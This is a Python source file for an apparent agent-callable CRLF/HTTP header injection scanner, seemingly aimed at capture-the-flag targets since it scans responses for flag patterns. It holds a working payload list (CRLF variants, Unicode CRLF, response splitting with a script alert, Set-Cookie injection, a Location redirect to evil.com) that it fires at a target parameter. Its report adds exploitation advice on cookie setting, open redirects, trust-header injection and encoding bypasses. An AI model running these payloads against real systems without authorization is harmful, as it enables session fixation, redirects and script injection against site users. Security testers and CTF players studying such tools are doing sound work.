"""CRLF / HTTP header injection probe (split from misc_probe_tools.py)."""

import json
import re
from typing import List, Optional, Tuple

import requests


class CrlfProbeTool:
    """
    CrlfProbeTool: detect CRLF / HTTP header injection vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/redirect",
          "param": "url",
          "method": "GET",
          "data": {},
          "timeout": 10
        }

    The tool injects CRLF payloads into the specified parameter and checks
    whether the injected header appears in the response headers or body.
    """

    name: str = "crlf_probe"
    description: str = (
        "Detect CRLF / HTTP header injection vulnerabilities. Input must be JSON with "
        "'url' (target URL) and 'param' (parameter to inject into). Optionally provide "
        "'method' (GET/POST, default GET), 'data' (extra form data), and 'timeout' "
        "(default 10). Tests various CRLF payloads including basic CRLF, LF-only, "
        "CR-only, response splitting, Unicode CRLF, cookie injection, and redirect "
        "injection. Returns a structured report of vulnerable payloads."
    )

    # CRLF injection payloads: (payload_suffix, description, detection_header, detection_value)
    PAYLOADS: List[Tuple[str, str, str, str]] = [
        (
            "%0d%0aInjected-Header:true",
            "Basic CRLF (%0d%0a)",
            "Injected-Header",
            "true",
        ),
        (
            "%0aInjected-Header:true",
            "LF only (%0a)",
            "Injected-Header",
            "true",
        ),
        (
            "%0dInjected-Header:true",
            "CR only (%0d)",
            "Injected-Header",
            "true",
        ),
        (
            "%0d%0a%0d%0a<script>alert(1)</script>",
            "Response splitting (body injection)",
            None,
            "<script>alert(1)</script>",
        ),
        (
            "%E5%98%8A%E5%98%8DInjected-Header:true",
            "Unicode CRLF (U+560A, U+560D)",
            "Injected-Header",
            "true",
        ),
        (
            "\\r\\nInjected-Header:true",
            "Literal backslash r/n",
            "Injected-Header",
            "true",
        ),
        (
            "%0d%0aSet-Cookie:crlf=injected",
            "Cookie injection via CRLF",
            "Set-Cookie",
            "crlf=injected",
        ),
        (
            "%0d%0aLocation:http://evil.com",
            "Redirect injection via CRLF",
            "Location",
            "http://evil.com",
        ),
    ]

    # Flag patterns
    FLAG_PATTERNS: List[str] = [
        r"(picoCTF\{[^}]+\})",
        r"(HTB\{[^}]+\})",
        r"(THM\{[^}]+\})",
        r"(FLAG\{[^}]+\})",
        r"(flag\{[^}]+\})",
        r"(CTF\{[^}]+\})",
        r"(ctf\{[^}]+\})",
    ]

    def __init__(self, session: Optional[requests.Session] = None) -> None:
        self.session = session or requests.Session()

    def _extract_flag(self, text: str) -> Optional[str]:
        """Try to extract a CTF flag from response text."""
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[CrlfProbeTool] Error: Invalid JSON input. {exc}"

        url = data.get("url", "").strip() if isinstance(data.get("url"), str) else ""
        param = (
            data.get("param", "").strip() if isinstance(data.get("param"), str) else ""
        )
        method = (data.get("method") or "GET").upper()
        form_data = data.get("data") or {}
        timeout = data.get("timeout", 10)

        if not url:
            return "[CrlfProbeTool] Error: 'url' is required."
        if not param:
            return (
                "[CrlfProbeTool] Error: 'param' (parameter to inject into) is required."
            )
        if method not in ("GET", "POST"):
            return (
                f"[CrlfProbeTool] Error: 'method' must be GET or POST, got '{method}'."
            )

        # Get baseline response
        baseline_data = {**form_data, param: "baseline_test_value"}
        try:
            if method == "GET":
                baseline_resp = self.session.get(
                    url, params=baseline_data, timeout=timeout, allow_redirects=False
                )
            else:
                baseline_resp = self.session.post(
                    url, data=baseline_data, timeout=timeout, allow_redirects=False
                )
            baseline_status = baseline_resp.status_code
            baseline_length = len(baseline_resp.text)
            baseline_headers = dict(baseline_resp.headers)
        except Exception as exc:
            return f"[CrlfProbeTool] Error getting baseline response: {exc}"

        # Test each payload
        vulnerable_payloads = []
        flags_found = []

        for payload_suffix, description, detect_header, detect_value in self.PAYLOADS:
            injected_value = f"test{payload_suffix}"
            test_data = {**form_data, param: injected_value}

            try:
                if method == "GET":
                    resp = self.session.get(
                        url, params=test_data, timeout=timeout, allow_redirects=False
                    )
                else:
                    resp = self.session.post(
                        url, data=test_data, timeout=timeout, allow_redirects=False
                    )

                is_vulnerable = False
                evidence = []

                # Check if injected header appears in response headers
                if detect_header:
                    for hdr_name, hdr_value in resp.headers.items():
                        if hdr_name.lower() == detect_header.lower():
                            if detect_value.lower() in hdr_value.lower():
                                is_vulnerable = True
                                evidence.append(
                                    f"Header found: {hdr_name}: {hdr_value}"
                                )
                            break

                # Check if CRLF content appears in the response body (response splitting)
                if detect_value and detect_value in resp.text:
                    is_vulnerable = True
                    evidence.append("Payload content found in response body")

                # Check for new headers not in baseline
                for hdr_name in resp.headers:
                    if hdr_name.lower() not in [h.lower() for h in baseline_headers]:
                        if hdr_name.lower() in ("injected-header",):
                            is_vulnerable = True
                            evidence.append(
                                f"New header appeared: {hdr_name}: {resp.headers[hdr_name]}"
                            )

                # Check for flags
                flag = self._extract_flag(resp.text)
                if flag:
                    flags_found.append(flag)
                    evidence.append(f"FLAG FOUND: {flag}")

                if is_vulnerable:
                    vulnerable_payloads.append(
                        {
                            "description": description,
                            "payload": injected_value,
                            "status": resp.status_code,
                            "evidence": evidence,
                        }
                    )

            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass

        # Build output report
        output_lines = [
            "[CrlfProbeTool] CRLF / Header Injection Probe Results",
            "=" * 55,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
            f"Payloads Tested: {len(self.PAYLOADS)}",
            f"Baseline Status: {baseline_status}",
            f"Baseline Length: {baseline_length} bytes",
            "",
        ]

        if flags_found:
            output_lines.append("!!! FLAGS FOUND !!!")
            for flag in flags_found:
                output_lines.append(f"  {flag}")
            output_lines.append("")

        if vulnerable_payloads:
            output_lines.append(
                f"VULNERABLE PAYLOADS ({len(vulnerable_payloads)} found):"
            )
            output_lines.append("-" * 40)
            for item in vulnerable_payloads:
                output_lines.append(f"  [{item['description']}]")
                output_lines.append(f"    Payload: {item['payload']}")
                output_lines.append(f"    Status: {item['status']}")
                for ev in item["evidence"]:
                    output_lines.append(f"    -> {ev}")
                output_lines.append("")
        else:
            output_lines.append("No CRLF injection vulnerabilities detected.")
            output_lines.append("")

        # Exploitation suggestions
        output_lines.append("RECOMMENDATIONS:")
        if vulnerable_payloads:
            output_lines.append("  [!] CRLF injection confirmed!")
            output_lines.append(
                "  - Try injecting Set-Cookie headers to set arbitrary cookies"
            )
            output_lines.append("  - Try injecting Location headers for open redirect")
            output_lines.append(
                "  - Try response splitting: inject a full HTTP response body"
            )
            output_lines.append(
                "  - Try injecting X-Forwarded-For or other trust headers"
            )
            output_lines.append("  - Combine with XSS via response body injection")
        else:
            output_lines.append(
                "  - No CRLF injection detected with standard payloads."
            )
            output_lines.append(
                "  - Try double-encoding (%250d%250a) or other bypass techniques."
            )
            output_lines.append(
                "  - Check if the parameter value is reflected in response headers."
            )

        return "\n".join(output_lines)
